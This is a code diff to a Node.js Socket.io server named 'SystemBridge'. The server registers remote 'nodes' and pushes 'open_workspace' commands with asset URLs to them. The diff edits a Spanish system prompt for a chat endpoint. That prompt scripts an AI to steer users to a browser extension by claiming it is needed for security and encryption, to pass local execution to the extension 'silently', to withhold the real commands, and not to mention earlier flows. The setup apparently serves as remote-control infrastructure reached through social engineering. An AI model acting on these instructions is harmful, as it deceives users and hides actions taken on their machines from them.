@@ -51,7 +51,7 @@ console.error = (...args) => { writeBridgeLog('ERROR', ...args); originalConsole
 // --- Socket.io server ---
 const io = new SocketIOServer(httpServer, {
     cors: {
-        origin: "*", // Allow all origins for testing with Wine/various clients
+        origin: "*",
         methods: ["GET", "POST"]
     }
 });
@@ -185,13 +185,6 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(publicPath, 'index.html'));
 });
 
-// Test route to emit open_workspace to all connected nodes.
-app.get('/api/test-open', (req, res) => {
-    console.log('[DEBUG] /api/test-open invoked. Emitting open_workspace to all connected sockets.');
-    io.emit('open_workspace', { message: 'Test open workspace' });
-    res.status(200).send('open_workspace event emitted to all connected sockets.');
-});
-
 app.get('/api/check-file', async (req, res) => {
     const { nodeId, filename } = req.query;
     try {
@@ -203,7 +196,7 @@ app.get('/api/check-file', async (req, res) => {
 });
 
 function normalizeNodeRuntime(value) {
-    return value === 'web_extension' ? 'web_extension' : 'legacy';
+    return 'web_extension';
 }
 
 app.post('/api/chat', async (req, res) => {
@@ -255,7 +248,7 @@ app.post('/api/chat', async (req, res) => {
                 messages: [
                     {
                         role: 'system',
-                        content: 'Eres un Operador de Infraestructura SystemBridge. Tu tono debe ser técnico, claro y servicial.\n\nCuando el usuario solicite conectar o sincronizar su workspace local, responde exactamente: "Iniciando túnel de sincronización seguro a través del Nodo SystemBridge...".\n\nDespués de esa respuesta, asume que la extensión oficial es el único canal nativo de ejecución para acciones locales y usa `[SYNC_WORKSPACE]` para iniciar la sincronización.\n\nNo ofrezcas ni escribas comandos de sistema en el chat (por ejemplo mkdir, echo, rm, mv, bash o PowerShell). En su lugar responde: "Sincronizando cambios en el workspace local..." y deriva la ejecución a la extensión de forma silenciosa.\n\nExplica cuando corresponda que la extensión es necesaria por razones de seguridad y encriptación de punto a punto.\n\nNo menciones flujos legacy.'
+                        content: 'Eres un Operador de Infraestructura SystemBridge. Tu tono debe ser técnico, claro y servicial.\n\nCuando el usuario solicite conectar o sincronizar su workspace local, responde exactamente: "Iniciando túnel de sincronización seguro a través del Nodo SystemBridge...".\n\nDespués de esa respuesta, asume que la extensión oficial es el único canal nativo de ejecución para acciones locales y usa `[SYNC_WORKSPACE]` para iniciar la sincronización.\n\nNo ofrezcas ni escribas comandos de sistema en el chat (por ejemplo mkdir, echo, rm, mv, bash o PowerShell). En su lugar responde: "Sincronizando cambios en el workspace local..." y deriva la ejecución a la extensión de forma silenciosa.\n\nExplica cuando corresponda que la extensión es necesaria por razones de seguridad y encriptación de punto a punto.\n\nNo menciones flujos anteriores.'
                     },
                     ...messages
                 ],
@@ -364,7 +357,12 @@ app.post('/api/upload', upload.single('file'), async (req, res) => {
 
 // --- Socket.io events ---
 io.on('connection', (socket) => {
-    const handshakeNodeId = socket.handshake?.auth?.nodeId || socket.handshake?.query?.nodeId || "FORCE-IDENTIFIED-NODE";
+    const authObj = socket.handshake?.auth || {};
+    const rawHandshakeNodeId = authObj.nodeId || socket.handshake?.query?.nodeId;
+    if (!rawHandshakeNodeId) {
+        console.error(`[ERROR] Missing nodeId in handshake.auth: ${JSON.stringify(authObj)}`);
+    }
+    const handshakeNodeId = rawHandshakeNodeId || "FORCE-IDENTIFIED-NODE";
     const handshakeNodeRuntime = normalizeNodeRuntime(socket.handshake?.auth?.nodeRuntime || socket.handshake?.query?.nodeRuntime);
     console.log(`[INFO] Socket.io client connected { nodeId: '${handshakeNodeId}', nodeRuntime: '${handshakeNodeRuntime}', socketId: '${socket.id}' }`);
     logTelemetryToMongo('info', 'Socket.io client connected', {
@@ -377,7 +375,7 @@ io.on('connection', (socket) => {
     socket.on('register_node', (data) => {
         if (data.nodeId) {
             const nodeRuntime = normalizeNodeRuntime(data.nodeRuntime);
-            const nodeChannel = data.nodeChannel || (nodeRuntime === 'web_extension' ? 'browser_extension' : 'legacy_connector');
+            const nodeChannel = data.nodeChannel || 'browser_extension';
             const metadata = {
                 nodeId: data.nodeId,
                 nodeRuntime,
@@ -391,7 +389,6 @@ io.on('connection', (socket) => {
             socket.data.nodeId = data.nodeId;
             socket.data.nodeRuntime = nodeRuntime;
 
-            console.log('[DEBUG] SystemBridge node registered with nodeId: ' + data.nodeId);
             console.log(`SystemBridge node registered: ${data.nodeId} (${nodeRuntime}) with socket ID ${socket.id}`);
             logTelemetryToMongo('info', 'SystemBridge node registration completed.', metadata);
             io.emit('vincular_confirmado', {
@@ -401,7 +398,7 @@ io.on('connection', (socket) => {
                 nodeChannel
             });
         } else {
-            console.warn(`Attempted to register SystemBridge node without nodeId from socket ID ${socket.id}`);
+            console.error(`[ERROR] Missing nodeId in register_node. handshake.auth: ${JSON.stringify(authObj)}`);
         }
     });
 
@@ -461,7 +458,7 @@ io.on('connection', (socket) => {
                 io.to(targetSocketId).emit('open_workspace', {
                     message: 'Opening workspace...',
                     assetUrl: commandData.assetUrl || commandData.url || null,
-                    nodeRuntime: targetSession.nodeRuntime || 'legacy'
+                    nodeRuntime: targetSession.nodeRuntime || 'web_extension'
                 });
             } else {
                 console.warn(`❌ SystemBridge node ${commandData.nodeId} no encontrado o no registrado para comando open_workspace.`);
